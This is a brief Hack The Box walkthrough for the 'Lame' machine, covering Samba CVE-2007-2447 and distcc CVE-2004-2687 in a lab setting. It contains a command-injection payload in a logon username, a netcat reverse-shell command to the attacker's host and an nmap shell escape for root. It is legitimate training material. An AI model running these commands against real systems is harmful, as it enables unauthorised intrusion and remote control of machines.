# Lame Hack The Box Tips

# ${{\color{purple}Initial Recon}}\ $

``nmap -T4 -p- -sV -oA fulllame 10.10.10.3``

![image](https://user-images.githubusercontent.com/123066149/227914441-6062cc6b-cf8e-42a9-9c72-e1bc5f1d13c7.png)

``smbmap -H 10.10.10.3``

![image](https://user-images.githubusercontent.com/123066149/227914624-f72106f8-18fc-4cbf-b30a-4fa719dd2118.png)

``smbclient //10.10.10.3/tmp``

### Target is vulnerable to CVE-2007-2447 

### The MS-RPC functionality in smbd in Samba 3.0.0 through 3.0.25rc3 allows remote attackers to execute arbitrary commands via shell metacharacters involving the (1) ### SamrChangePassword function, when the "username map script" smb.conf option is enabled, and allows remote authenticated users to execute commands via shell metacharacters involving other MS-RPC functions in the (2) remote printer and (3) file share management.


### POC :

``logon "/=`nohup ping -c 2 10.10.16.3`"``

![image](https://user-images.githubusercontent.com/123066149/227915121-e81e5d96-d2fa-4b0c-a677-2396bf1ad7c0.png)

![image](https://user-images.githubusercontent.com/123066149/227915538-909ce755-c397-4d11-ab41-4c3d81b64a4e.png)

### I used thie exploit :

https://github.com/amriunix/CVE-2007-2447

![image](https://user-images.githubusercontent.com/123066149/227916810-6209f211-c8b8-43c3-b48f-93dc98acff44.png)


# ${{\color{purple}Initial Foothold}}\ $

nmap --script vuln 10.10.10.3 -p 3632

![image](https://user-images.githubusercontent.com/123066149/227918971-c481c332-b91a-4118-bf21-8036c2cca88f.png)

# ${{\color{purple}Exploitation}}\ $

nmap -p 3632 10.10.10.3 --script distcc-cve2004-2687.nse --script-args="distcc-exec.cmd='id'"

![image](https://user-images.githubusercontent.com/123066149/227919097-ed13e420-f29d-4a03-b4c4-e0c8fd95297c.png)

![image](https://user-images.githubusercontent.com/123066149/227919317-d69b3b14-b0e3-4753-a894-f4efd49c2c88.png)

### i used this exploit :

https://gist.github.com/DarkCoderSc/4dbf6229a93e75c3bdf6b467e67a9855

``python2.7 distccd_rce_CVE-2004-2687.py -t 10.10.10.3 -p 3632 -c 'nc -c sh 10.10.16.3 9001'``

![image](https://user-images.githubusercontent.com/123066149/227919838-a1debd22-3d6e-4913-bd2e-5ea2346b415f.png)

# ${{\color{purple}Privilege Escalation}}\ $

![image](https://user-images.githubusercontent.com/123066149/227919996-4c385cfb-e1dc-4963-b96e-cd01a8ea5194.png)

``nmap --interactive``
``!sh``

![image](https://user-images.githubusercontent.com/123066149/227920158-d2c8b115-e35a-4ade-a3c4-b447ebdf47bf.png)


# ${{\color{purple}Points of Improvement}}\ $

* Find version of ubuntu : ``lsb_release -a``
